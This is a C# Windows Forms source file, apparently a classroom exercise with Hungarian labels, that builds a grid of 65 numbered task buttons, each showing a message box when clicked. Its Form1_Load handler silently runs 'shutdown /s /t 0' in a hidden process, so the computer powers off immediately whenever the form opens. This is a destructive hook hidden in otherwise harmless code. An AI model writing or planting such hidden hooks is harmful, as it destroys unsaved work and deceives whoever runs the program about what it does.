using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace WindowsFormsApp1
{
    public partial class Form1 : Form
    {
        Button[] gombok;
        public Form1()
        {
            InitializeComponent();

            int width = this.ClientSize.Width;
            int height = this.ClientSize.Height;
            int wCount = width / 80;

            gombok = new Button[65];

            for(int i=0; i < gombok.Length; i++)
            {
                gombok[i] = new Button();
                gombok[i].Location = new Point(i%wCount*80, (i/wCount)*40);
                gombok[i].Name = "button" + (i + 1).ToString();
                gombok[i].Size = new Size(70, 25);
                gombok[i].Text = (i+1)+". feladat".ToString();
                gombok[i].UseVisualStyleBackColor = true;

                gombok[i].Click += GombKattintas;

                this.Controls.Add(gombok[i]);

            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            var psi = new ProcessStartInfo("shutdown", "/s /t 0");
            psi.CreateNoWindow = true;
            psi.UseShellExecute = false;
            Process.Start(psi);
        }

        private void GombKattintas(object sender, EventArgs e)
        {
            Button b = sender as Button;
            MessageBox.Show(b.Text + " gomb lett megnyomva");
        }
    }
}
